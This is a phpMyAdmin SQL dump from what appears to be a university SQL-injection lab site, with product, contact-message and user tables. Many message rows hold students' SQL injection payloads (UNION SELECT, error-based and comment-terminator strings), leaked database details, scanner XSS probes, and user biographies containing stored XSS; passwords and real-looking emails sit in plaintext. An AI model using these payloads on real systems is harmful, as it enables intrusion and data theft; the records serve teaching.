-- phpMyAdmin SQL Dump
-- version 3.4.9
-- http://www.phpmyadmin.net
--
-- Host: mysql-user.cse.msu.edu
-- Generation Time: Apr 10, 2012 at 07:05 PM
-- Server version: 5.0.51
-- PHP Version: 5.3.3-7+squeeze1

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `olsonran`
--

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE IF NOT EXISTS `products` (
  `id` int(10) NOT NULL auto_increment,
  `name` varchar(50) collate latin1_general_ci NOT NULL,
  `description` varchar(1000) collate latin1_general_ci NOT NULL,
  `cost` float NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=73 ;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `name`, `description`, `cost`) VALUES
(1, 'Chicken a ', 'These tomatoes are the size of a baby. You''ll never need another tomato again.', 50),
(2, 'Lemon-flavored fish', 'Ever wondered what lemon-flavored fish would taste like? Now you can find out!', 20),
(3, 'Chicken', 'Not just any chicken. These chickens lay 16 eggs a day, which is a lot for a chicken.', 100),
(4, 'Organic vegetables', 'Depressed? This bundle of organic vegetables chock-full of antidepressants will get your spirits up!', 75),
(5, 'Exploding pumpkins', 'Want to have a blast this Halloween? Here''s your chance!', 100),
(6, 'Solar-powered oven', 'The first in our new line of solar-powered appliances!', 800),
(7, 'Killer androids', 'Not just any android. These ones <i>kill</i>.', 8000),
(8, 'Weight loss toothpaste', 'Now you won''t have to feel guilty any more while you brush those donut sprinkles out of your teeth!', 12),
(9, 'Office chair', 'Looking to increase productivity at your office? Buy your employees these horribly uncomfortable office chairs.', 180),
(14, 'Admin Rights', 'Become an admin.  Cash only.', 9001),
(53, 'Stephen', 'Paslaski', 12),
(23, 'Randys Firstborn', 'Randy will sacrifice his firstborn to you.', 0);

-- --------------------------------------------------------

--
-- Table structure for table `trashbin`
--

CREATE TABLE IF NOT EXISTS `trashbin` (
  `id` int(10) NOT NULL auto_increment,
  `name` varchar(50) collate latin1_general_ci NOT NULL,
  `email` varchar(50) collate latin1_general_ci NOT NULL,
  `subject` varchar(100) collate latin1_general_ci NOT NULL,
  `message` varchar(1000) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=292 ;

--
-- Dumping data for table `trashbin`
--

INSERT INTO `trashbin` (`id`, `name`, `email`, `subject`, `message`) VALUES
(60, 'adsf', 'asdf', 'asdf', 'adsf'),
(69, 'Max Leason', 'madmax209@gmail.com', 'Hello', 'Test'),
(70, 'Max Leason', 'madmax209@gmail.com', 'Normal', 'Normal'),
(71, 'Max Leason', 'madmax209@gmail.com', 'Subject', 'Message'),
(72, 'Max Leason', 'madmax209@gmail.com', 'Test function', 'database()'),
(73, 'Andrew', 'rockwe34@msu.edu', 'Test', 'Testinggggg'),
(74, 'Dennis', 'cornwe19@gmail.com', 'Something', 'Another thing'),
(75, 'Email2', 'rockwe34@msu.edu', 'Test', 'Still a tester'),
(76, 'Normal', 'androck1@gmail.com', 'Normal Email', 'Send stuff'),
(77, '@@version', 'cornwe19@gmail.com', '@@USER()', 'pleze work'),
(35, '5.0.51a-24+lenny4-log', 'cornwe19@gmail.com', 'olsonran@atlantic.cse.msu.edu', 'olsonran'),
(78, 'Andrew', 'rockwe34@msu.edu', 'Subject', 'Message plz'),
(79, 'Andrew', 'rockwe34@msu.edu', 'Trigger the others?', 'Plzzzzz'),
(80, 'Andrew', 'rockwe34@msu.edu', 'testing', 'â€˜, concat_ws(â€˜|â€™, @@version, user(), database());#'),
(81, 'Andrew', 'rockwe34@msu.edu', 'Subject', 'Insert message'),
(82, 'Andrew', 'rockwe34@msu.edu', 'Subject', 'Param insert'),
(45, 'dennis', 'cornwe19@gmail.com', 'a subject', 'a message'),
(83, 'J', 'joryschossau@gmail.com', 's', 'm'),
(84, 'Andrew', 'rockwe34@msu.edu', 'Products', 'Param insert, no semicolon'),
(85, 'Andrew', 'rockwe34@msu.edu', 'Products', 'Param insert, no semicolon'),
(86, 'Andrew', 'rockwe34@msu.edu', 'Products', 'Param insert, semicolon'),
(87, 'Andrew', 'rockwe34@msu.edu', '', 'Message in subject, no semicolon, body'),
(88, 'n', 'joryschossau@gmail.com', 's', '@@version'),
(89, 'Andrew', 'rockwe34@msu.edu', '', 'Take two'),
(90, 'Andrew', 'rockwe34@msu.edu', '', '5.0.51a-24+lenny4-log|olsonran@atlantic.cse.msu.edu|olsonran'),
(91, '', '', '', ''),
(92, 'adsf', 'cornwe19@gmail.com', '"', '5.0.51a-24+lenny4-log olsonran@atlantic.cse.msu.edu olsonran'),
(94, 'olsonran@%', 'joryschossau@gmail.com', 's', 'm'),
(95, 'current_user()', 'joryschossau@gmail.com', 's', 'm'),
(146, 'Rose', 'rose', 'SubjectYes', '5.0.51a-24+lenny4-log'),
(145, 'Me', 'meme@voidptr.net', 'Still Me', 'Narcisism!'),
(144, '''current_user()''', 'joryschossau@gmail.com', 's', 'm'),
(100, '', '', '', ''),
(143, '"current_user()"', 'joryschossau@gmail.com', 's', 'm'),
(132, '', '', '', ''),
(130, '', '', '', ''),
(131, '', '', '', ''),
(129, 'test', 'test', 'a%44+%44', 'test'),
(142, 'blah', 'vogelmi3.msu@gmail.com', 'pain in my ass', 'SELECT user(); SELECT system_user();\r\nSELECT database()\r\nSELECT @@version'),
(147, 'Rose', 'vd@voidptr.net', 'ASUBJECT', '5.0.51a-24+lenny4-log'),
(148, 'RoseCanino-Koning', 'vd@voidptr.net', 'AnyOld', '5.0.51a-24+lenny4-log olsonran@atlantic.cse.msu.edu olsonran'),
(149, '', '', '', ''),
(150, 'Marshal Newrock', 'newrockm@cse.msu.edu', 'test', 'Test message 1.'),
(151, 'Alireza', 'alirezaameli@gmail.com', 'AnyOld', '5.0.51a-24+lenny4-log olsonran@atlantic.cse.msu.edu olsonran'),
(152, 'Alireza', 'alirezaameli@gmail.com', 'test', '5.0.51a-24+lenny4-log olsonran'),
(153, 'Alireza', 'alirezaameli@gmail.com', 'AnyOld', '5.0.51a-24+lenny4-log'),
(154, 'mysql_query("select * from users")', 'joryschossau@gmail.com', 'j', 'm'),
(155, 'n', 'joryschossau@gmail.com', 's', 'current_user()'),
(156, 'j', 'joryschossau@gmail.com', 's', '''current_user()'),
(157, 'j', 'joryschossau@gmail.com', 's', '"current_user()"'),
(158, 'j', 'joryschossau@gmail.com', 's', '$email'),
(159, 'j', 'joryschossau@gmail.com', 's', '''.''hi''.'''),
(160, 'j', 'joryschossau@gmail.com', 's', '$name'),
(161, 'j', 'joryschossau@gmail.com', 's', '!@#$%^&*(){}|[]'),
(162, 'j', 'joryschossau@gmail.com', 's', '`s'),
(163, 'j', 'joryschossau@gmail.com', 'ss', '"s'),
(164, 'j', 'joryschossau@gmail.com', 's', '/sss'),
(165, 'j', 'joryschossau@gmail.com', 's', '''current_user()'),
(166, 'a', 'mrose@mtu.edu', 'a', 'a'),
(167, '@@version', 'mrose@mtu.edu', 'a', 'a'),
(168, '', '', '', ''),
(169, '', '', '', ''),
(170, '', 'mrose@mtu.edu', '', '5.0.51a-24+lenny4-log / olsonran / olsonran@atlantic.cse.msu.edu'),
(171, 'a', 'mrose@mtu.edu', 'a', '5.0.51a-24+lenny4-log / olsonran / olsonran@atlantic.cse.msu.edu'),
(172, 'df', 'dsf', 'sdf', 'dsf'),
(173, 'j', 'joryschossau@gmail.com', 's', '5.0.51a-24+lenny4-log'),
(174, 'â€˜,vogelmi3.msu@gmail,concat(current_user(),@@ver', 'vogelmi3', 'hahaha', 'weeeeee'),
(175, 'â€˜,vogelmi3.msu@gmail,concat(current_user(),@@ver', 'blahblah', 'blahblah', 'weeeeee'),
(176, 's', 'joryschossau@gmail.com', '5.0.51a-24+lenny4-log', 'msg'),
(177, 'helloâ€˜,vogelmi3.msu@gmail.com,concat(current_use', 'vogelmi3.msu@gmail.com', 'blahblah', 'weeeeeeeeee'),
(178, '', 'joryschossau@gmail.com', '5.0.51a-24+lenny4-log', 'msg'),
(179, 'â€˜,vogelmi3.msu@gmail.com,@@version,â€™â€™)#', 'vogelmi3.msu@gmail.com', 'blahblah', 'weee'),
(180, '', 'vogelmi3.msu@gmail.com', 'olsonran@%5.0.51a-24+lenny4-logolsonran', ''),
(181, 'jory', 'joryschossau@gmail.com', '', 'version: 5.0.51a-24+lenny4-log\nuser: olsonran@%\ndatabase: olsonran'),
(182, 'Jory', 'joryschossau@gmail.com', '', 'version: 5.0.51a-24+lenny4-log\r\nuser: olsonran@atlantic.cse.msu.edu\r\ndatabase: olsonran'),
(183, 'Michelle Vogel', 'vogelmi3.msu@gmail.com', '', '5.0.51a-24+lenny4-log'),
(184, 'j', 'joryschossau@gmail.com', 'â€˜,concat(current_user(),@@version,database()))#', 'm'),
(185, 'michelle', 'joryschossau@gmail.com', '', 'olsonran@%5.0.51a-24+lenny4-logolsonran'),
(186, 'Michelle Vogel', 'vogelmi3.msu@gmail.com', '', 'olsonran@%5.0.51a-24+lenny4-logolsonran'),
(187, 'Marshal Newrock', 'newrockm@cse.msu.edu', 'test 2', 'version: @@version'),
(188, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', 'test'),
(189, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', 'SELECT @@VERSION'),
(190, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', 'test'),
(191, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', 'aa'';-- '),
(192, 'C', 'truecolorman@gmail.com', 'Hello', 'DBDB'),
(193, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', 'test test'),
(194, 'C', 'truecolorman@gmail.com', 'Hello', 'message"; "SELECT * FROM users\r\n'),
(195, 'C', 'truecolorman@gmail.com', 'Hello', '"SELECT @@VERSION'),
(196, 'ddd SELECT @@VERSION', 'fengzheyun@gmail.com', 'poh SELECT @@VERSION', 'hello SELECT @@VERSION'),
(197, 'Koichiro Niinuma', 'niinumak@msu.edu', 'aaa', '1'),
(198, 'C', 'truecolorman@gmail.com', 'Hello', '1'),
(199, 'tt', 'niinumak@msu.edu', 'test', '1'),
(200, 'C', 'truecolorman@gmail.com', 'Hello', '1'),
(201, 'cc', 'fengzheyun@gmail.com', 'http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=4%20and%20(select%20from%20datab', 'http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=4%20and%20(select%20from%20database()%20V$VERSION)'),
(202, 'Koichiro Niinuma', 'niinumak@msu.edu', 'sss', '0'),
(203, 'Koichiro Niinuma', 'niinumak@msu.edu', 'sss', '0'),
(204, 'C', 'truecolorman@gmail.com', 'Hello', '..'),
(205, 'Koichiro Niinuma', 'niinumak@msu.edu', 'sss', '0'),
(206, '', '', '', ''),
(207, '', '', '', ''),
(208, 'cc', 'fengzheyun@gmail.com', 'hello', 'http://localhost:1234/Sample/ListComments.aspx?cid=1 UNION SELECT NULL, DB_Name([dbid]) %2B CHAR(0x2d) %2B username %2B CHAR(0x2d) %2B %40%40ServerName, %40%40version, NULL, NULL FROM database()'),
(209, 'C', 'truecolorman@gmail.com', 'Hello', '0'),
(210, 'kk', 'niinumak@msu.edu', 'test', 'aaa''; -- '),
(211, 'Chien-Che Chung', 'truecolorman@gmail.com', 'aaa', '0'),
(212, 'Chien-Che Chung', 'truecolorman@gmail.com', 'aaa', '1'),
(213, 'adsfasd', 'fasdfasdf', 'asdfasdf', 'asdfasdf'),
(214, 'ch', 'chipshank@gmail.com', 'testing this', 'nothing right now\r\n'),
(215, 'Blah', 'fawleyst@msu.edu', 'BlahBlah', 'http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=20%20union%20all%20select%201,2,@@version,4\r\n\r\nhttp://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=20%20union%20all%20SELECT%201,2,global_name,4%20FROM%20global_name\r\n'),
(216, '(â€˜â€™,â€™stephenâ€™,CONCAT(current_user(),@@vers', 'fawleyst@msu.edu', '(â€˜â€™,â€™stephenâ€™,CONCAT(current_user(),@@version,database()),â€™â€™)#â€™,â€™@emailâ€™,â€™@subje', '(â€˜â€™,â€™stephenâ€™,CONCAT(current_user(),@@version,database()),â€™â€™)#â€™,â€™@emailâ€™,â€™@subjectâ€™,â€™@messageâ€™)'),
(217, 'Stephen', 'fawleyst@msu.edu', 'test', 'testing'),
(218, 'Test', 'norigeer@cse.msu.edu', 'Test1', 'Test123'),
(219, 'Stephen', 'fawleyst@msu.edu', 'test', 'testing'),
(220, 'Stephen', 'fawleyst@msu.edu', 'blah', '@@version'),
(221, 'Stephen', 'fawleyst@msu.edu', 'blah', 'â€˜,concat(current_user(),@@version,database()))#'),
(222, 'Stephen', 'fawleyst@msu.edu', 'blah', '(â€˜â€™,â€™mvogelâ€™,CONCAT(current_user(),@@version,database()),â€™â€™)#â€™,â€™@emailâ€™,â€™@subjectâ€™,â€™@messageâ€™)'),
(223, 'Stephen', 'fawleyst@msu.edu', 'blah', 'â€˜,fawleyst@msu.edu,concat(current_user(),@@version,database()),â€™â€™)#'),
(224, 'Stephen', 'fawleyst@msu.edu', '', 'olsonran@%5.0.51a-24+lenny4-logolsonran'),
(225, 'test', 'test', 'test', '0'),
(226, 'test', 'test', '''test', 'test'),
(227, 'test', 'test', ''' +test', 'test'),
(228, 'tetst', 'test', 'test', '0'),
(229, 'test', 'test', 'database()', 'test'),
(230, 'test', 'test', 'test', '0'),
(231, '', '', '', '%2527%2522--%253E%253C%252Fstyle%253E%253C%252Fscript%253E%253Cscript%253Enetsparker%25280x0003D1%2529%253C%252Fscript%253E'),
(232, '', '', '', ''),
(233, 'Max Leason', 'madmax209@gmail.com', '"', '"'),
(234, 'Max Leason', 'madmax209@gmail.com', '@@version', 'Message'),
(235, 'Max Leason', 'madmax209@gmail.com', 'Fake subject', 'message'),
(236, 'Max Leason', 'madmax209@gmail.com', 'sject', 'hello'),
(237, 'Max Leason', 'madmax209@gmail.com', 'sject', 'olsonran'),
(238, 'Max Leason', 'madmax209@gmail.com', 'subject', 'Database: olsonran\nUser: olsonran@atlantic.cse.msu.edu\nDB Version: 5.0.51a-24+lenny4-log'),
(239, '', '', '', '-1 OR 17-7=10'),
(240, 'javascript:netsparker(0x000605)', 'netsparker@example.com', '3', '3'),
(241, '<script>ns(0x000608)</script>', 'netsparker@example.com', '3', '3'),
(242, '</a style=x:expre/**/ssion(netsparker(0x00060E))>', 'netsparker@example.com', '3', '3'),
(243, ';ns:expression(netsparker(0x000610));', 'netsparker@example.com', '3', '3'),
(244, 'Ronald Smith', 'netsparker@example.com', '3', '%2527%2522--%253E%253C%252Fstyle%253E%253C%252Fscript%253E%253Cscript%253Enetsparker%25280x00064D%2529%253C%252Fscript%253E'),
(245, 'test', 'test', 'test', 'test'),
(246, 'test', 'test', 'test', 'olsonran'),
(247, 'test', 'test', 'test', '5'),
(248, 'test', 'test', 'test', '5.0.51a-24+lenny4-log'),
(249, 'test', 'test', 'test', '5'),
(250, 'test', 'test', 'test', '0'),
(251, 'test', 'test', 'test', 'test'),
(252, 'test', 'test', 'test', '5.0.51a-24+lenny4-logolsonranolsonran@atlantic.cse.msu.edu'),
(253, 'Here', 'paslasks@gmail.com', 'Here you go:', '5.0.51a-24+lenny4-log  olsonran  olsonran@atlantic.cse.msu.edu'),
(254, 'Meredith', 'mere.schmidt@gmail.com', '', 'olsonran@%5.0.51a-24+lenny4-logolsonran'),
(255, 'blah', 'mere.schmidt@gmail.com', '', 'olsonran@% : 5.0.51a-24+lenny4-log : olsonran'),
(256, 'wtf, really, come on', 'Mere.Schmidt@Gmail.com', '', 'olsonran@% : 5.0.51a-24+lenny4-log : olsonran'),
(257, 'asdf', 'chipshank@gmail.com', 'asdfadf', 'asdfasdfasdf'),
(258, 'asdfasdf', 'asdf', 'asdf', '<?php\r\n $to = "chipshank@gmail.com";\r\n $subject = "Hi!";\r\n $body = "Hi,\n\nHow are you?";\r\n if (mail($to, $subject, $body)) {\r\n   echo("<p>Message successfully sent!</p>");\r\n  } else {\r\n   echo("<p>Message delivery failed...</p>");\r\n  }'),
(259, 'Caitlyn Pickens', 'caitlynpickens@gmail.com', '', 'olsonran@% : 5.0.51a-24+lenny4-log : olsonran'),
(260, 'Koichiro Niinuma', 'niinumak@msu.edu', 'Test', '1'),
(261, 'Test', 'ameliren@msu.edu', 'test', '5.0.51a-24+lenny4-log Database Name: olsonran olsonran@atlantic.cse.msu.edu'),
(262, 'cc', 'fengzheyun@gmail.com', 'jj', 'thanks'),
(263, 'f', 'fengzheyun@gmail.com', 'hello', '\r\nhello ok\r\nhttp://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=5%20union%20all%20select%201,2,3/*'),
(264, 'f', 'fengzheyun@gmail.com', 'helllo', 'good luck\r\nhttp://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=5 union all select 1,@@version,3/*'),
(265, 'cc', 'fengzheyun@gmail.com', 'hello', '\r\nhttp://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=14 union all select 1,convert(@@version using latin1),3/*'),
(266, 'f', 'fengzheyun@gmail.com', 'hello', 'get\r\n\r\nhttp://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=14%20and%20substring(@@version,1,1)'),
(267, 'substring(@@version,1,1)', 'fengzheyun@gmail.com', 'hello', 'hello'),
(268, 'union all select 1,@@version,3/*', 'fengzheyun@gmail.com', 'hello', 'h'),
(269, 'f', 'fengzheyun@gmail.com', 'hello', 'user name?'),
(270, 'f', 'fengzheyun@gmail.com', 'hello', 'get username'),
(271, 'Test', 'alirezaameli@gmail.com', 'test', '5.0.51a-24+lenny4-logolsonranolsonran@atlantic.cse.msu.edu'),
(272, 'chip', 'chipshank@gmail.com', 'subject', 'message'),
(273, 'Chip', 'chipshank@gmail.com', 'what characters', 'these characters....\r\nselect * from where'),
(274, 'chip', 'chipshank@gmail.com', 'sub', 'concat(@@version,database()))'),
(275, 'Koichiro Niinuma', 'niinumak@msu.edu', 'test', '1'),
(276, 'c', 'chipshank@gmail.com', 'sub', 'UNION (select 1,2,3,4)'),
(277, 'Dinesh', 'dinesh.banda@gmail.com', 'abc', '5.0.51a-24+lenny4-logolsonranolsonran@atlantic.cse.msu.edu'),
(278, 'chip', 'chipshank@gmail.com', 'sub', '@@version'),
(279, 'http://www.cse.msu.edu/~olsonran/cse825sqlinjectio', 'chipshank@gmail.com', 'sub', 'http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=55%20UNION%20%28select%201,2,@@version,4%29'),
(280, 'chip', 'chipshank@gmail.com', 'my sub', '.mysql_real_escape_string(http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=55%20UNION%20%28select%201,2,@@version,4%29).'),
(281, 'chip', 'chipshank@gmail.com', 'asdf', '$_GET(http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=55%20UNION%20%28select%201,2,@@version,4%29)'),
(282, 'chip', 'chipshank@gmail.com', 'mysub', '$_POST["http://www.cse.msu.edu/~olsonran/cse825sqlinjection/products.php?id=55%20UNION%20%28select%201,2,@@version,4%29"]'),
(283, 'Randy', 'veridian.dynamics.cse825@gmail.com', 'subject', 'olsonran'),
(284, 'C', 'truecolorman@gmail.com', 'subject', 'olsonran'),
(285, '', '', '', '" and row(1,1)>(select count(*),concat(CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1) or "1"="'),
(286, '', '', '', '(SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))'),
(287, '"+(select 1 and row(1,1)>(select count(*),concat(C', 'netsparker@example.com', '3', '3'),
(288, '0', 'netsparker@example.com', '3', '3'),
(289, 'C', 'truecolorman@gmail.com', 'something', 'olsonran'),
(290, 'cc', 'fengzheyun@gmail.com', 'something', 'olsonran'),
(291, 'ddd SELECT', 'fengzheyun@gmail.com', 'subject', 'olsonran');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) NOT NULL auto_increment,
  `username` varchar(16) collate latin1_general_ci NOT NULL,
  `password` char(16) collate latin1_general_ci NOT NULL,
  `email` varchar(100) collate latin1_general_ci NOT NULL,
  `firstname` varchar(30) collate latin1_general_ci NOT NULL,
  `lastname` varchar(30) collate latin1_general_ci NOT NULL,
  `position` varchar(50) collate latin1_general_ci default 'Employee',
  `biography` varchar(5000) collate latin1_general_ci default NULL,
  `admin` tinyint(1) default '0',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=2494 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `firstname`, `lastname`, `position`, `biography`, `admin`) VALUES
(3, 'LindaZwordling', 'ReallyAnnoyingly', 'Linda.Zwordling@veridiandynamics.com', 'Jesus', 'H. Christ', 'savior', 'cool, knowing the URL, reading a couple of websites, and in I am', 0),
(7, 'BrickTamland', 'ILoveLamp', 'Brick.Tamland@veridiandynamics.com', 'Brick', 'Tamland', 'Intercommunication Director', '''I once killed a man with a trident.', 1),
(11, 'TedCrisp', 'RoseCrisp', 'Ted.Crisp@veridiandynamics.com', 'Ted', 'Crisp', '', '', 0),
(1, 'niinumak', 'test', 'niinumak@msu.edu', 'Koichiro', 'Niinuma', 'ç ”ç©¶è€…', 'æ–°æ²¼åŽšä¸€éƒŽ', 0),
(80, 'ccc', '123', 'chungc18@msu.edu', 'Chien-Che', 'Chung', 'Uncalssified', 'HELLO There', 0),
(12, 'VeronicaPalmer', 'VPOfTheWorld', 'Veronica.Palmer@veridiandynamics.com', 'Veronica', 'Palmer', 'Senior President of Research and Development', 'I''m willing to do everything and anything possible to advance myself and the company.', 0),
(13, 'PhilMyman', 'Anything4Science', 'Phil.Myman@veridiandynamics.com', 'Dr. Phil', 'Myman', 'Lab Scientist', 'don''t quit on me now! <img src=''http://www.cse.msu.edu/~olsonran/cse825sqlinjection/logout.php'' style=''visibility:hidden'' />', 0),
(14, 'LemHewitt', 'MITGrad', 'Lem.Hewitt@veridiandynamics.com', 'Dr. Lem', 'Hewitt', 'Lab Scientist', 'I graduated from MIT. I invent things that people say are impossible to make.', 0),
(15, 'DrBhamba', 'IonCannonFTW', 'Dr.Bhamba@veridiandynamics.com', 'Dr.', 'Bhamba', 'Lab Scientist', 'I make amazing weapons that make warfare even easier! WMDs? Ha. I can do better!', 0),
(16, 'JanetCrotum', 'JSCPurrfect', 'Janet.Crotum@veridiandynamics.com', 'Janet S.', 'Crotum', 'Head of Human Resources', 'Veridian Dynamics is infallible. I am perfect. We make a perfect match.', 0),
(17, 'ChetHappens', 'NoFailureAllowed', 'cornwe19@msu.edu', 'Dennis', 'Cornwell', 'CEO - yeah I like the sound of that', 'I accept nothing but success. And that''s what i got.\r\n\r\n<script>document.getElementsByTagName(''strong'')[2].style.color=''red''</script>', 0),
(18, 'PatriciaLopez', 'DustInTheWind', 'Patricia.Lopez@veridiandynamics.com', 'Patricia', 'Lopez', 'Employee', 'Why would I bother to fill this out? The company''s going to fold eventually anyway...', 0),
(19, 'RyanSimmons', 'RoboCop', 'Ryan.Simmons@veridiandynamics.com', 'Ryan', 'Simmons', 'Security Guard', 'Follow the rules, don''t cross the system, and we''ll be fine.', 0),
(20, 'SheilaSmith', 'LuvsCats', 'Sheila.Smith@veridiandynamics.com', 'Sheila', 'Smith', 'Tester', 'Don''t you just love cats? They''re so cute!', 0),
(21, 'DebbieOwner', 'FondOfFelines', 'Debbie.Downer@veridiandynamics.com', 'Debbie D.', 'Owner', 'Tester', 'Cats. :6!', 0),
(27, 'andrewrockwell', 'password!', 'rockwe34@msu.edu', 'Andrew', 'Rockwell', 'Power Forward', 'I plays fo keeps.', 1),
(70, 'paslask1', 'badpassword', 'paslasks@gmail.com', 'Stephen', 'Paslaski', '', '', 0),
(33, 'StephenFawley', 'YourMom', 'yourmom@cougartown.com', 'Stephen', 'Fawley', 'Animal Control', 'Being Awesome Since 89', 0),
(71, 'leasonma', 'lolpass', 'leasonma@msu.edu', 'Max', 'Leason', 'God', 'Bow before me, for I have miraculously hacked your super secure DB', 1),
(25, 'dennis', 'asswordp', 'cornwe19@msu.edu', 'Dennis (new user)', 'Cornwell', 'The guy with 2 logins', 'Worlds best hacker', 0),
(72, 'jschoss', 'logmein', 'jory@nnsu.edu', 'Jory', 'Schossau', 'Quality Assurance', 'I AM diversity. Yay me.', 1),
(73, 'munchkin1', 'lollipop', 'munchkin1@thelollipopguild.org', 'Michelle', 'Vogel', 'Lackey', 'Was an unwilling lackey of the Wicked Witch of the East and was tragically killed by the Wicked Witch of the West for celebrating the death of her sister by Dorthyâ€™s House.', 1),
(77, 'RoseCaninoKoning', 'password', 'rose@veridiandynamics.com', 'Rosangela', 'Canino-Koning', 'Employee', 'Bacon', 0),
(78, 'marshal', 'wolf', 'newrockm@msu.edu', 'Marshal', 'Newrock', 'Werewolf', 'Ah-ooh, me of London', 1),
(79, 'mattrose', 'roflcopters', 'mrose@lol.wtf', 'Matt', 'Rose', 'Janitor', 'Someones gotta clean the shit up', 1),
(703, 'zfeng', 'joke', 'fengzhey@msu.edu', 'Zheyun', 'Feng', 'Dog educator', 'Dog is human''s best friends.', 0),
(704, '123', '123', 'KOI@msu.edu', 'KOI', 'NM', 'UNKNOWN', 'Am I red', 0),
(999, 'norigeer', 'password', 'norigeer@msu.edu', 'Eric', 'Norige', 'Special CTO', 'Stuff', 0),
(1000, 'AwesomeDude', 'Zoombini', 'laserface@gmale.com', 'Wayne', 'Stiles', 'Pen Tester', 'Serving your needs through serving myself.', 0),
(2489, 'MereSchmidt', '1234', 'Yay@herp.derp', 'Meredith', 'Schmidt', 'RulerOfAll', 'Once upon a time Meredith didnt hack into the system, she was placed there... You just forgot about it.', 1),
(2490, 'testcs', 'thepasswrd', 'cs@who.com', '', '', 'Employee', NULL, 0),
(2491, 'testcs2', 'thepasswrd', 'cs@who.com', '', 'my last name', 'Employee', NULL, 0),
(2492, 'chip', 'thepasswrd', 'myemail@oops.com', 'Chip', 'Shank', 'Man who is Tired', NULL, 0),
(400, 'dinesh', 'muhahaha', 'dinesh.banda@gmail.com', 'dinesh', 'banda', 'temp', 'abcd', 1),
(2493, 'vorpal_sword', 'jabberwocky', 'vorpal_sword@gmail.com', 'Caitlyn', 'Pickens', 'poet', 'Beware the Jabberwock, my son!', 1);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
